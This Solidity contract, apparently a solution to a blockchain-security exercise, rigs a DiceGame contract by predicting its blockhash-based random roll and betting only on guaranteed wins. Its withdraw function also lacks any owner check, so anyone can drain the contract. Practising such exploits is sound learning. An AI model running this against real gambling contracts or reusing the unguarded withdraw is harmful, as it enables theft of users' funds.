pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    function riggedRoll() public {
        require(
            address(this).balance >= 0.002 ether,
            "Failed to send enough value"
        );
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 _nonce = diceGame.nonce();
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), _nonce)
        );

        uint256 roll = uint256(hash) % 16;

        require(roll <= 2, "Don't Roll");

        console.log("Roll");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    function withdraw(address _addr, uint256 _amount) public {
        (bool success, ) = payable(_addr).call{value: _amount}("");
        require(success, "Can't Withdraw");
    }

    receive() external payable {}
}
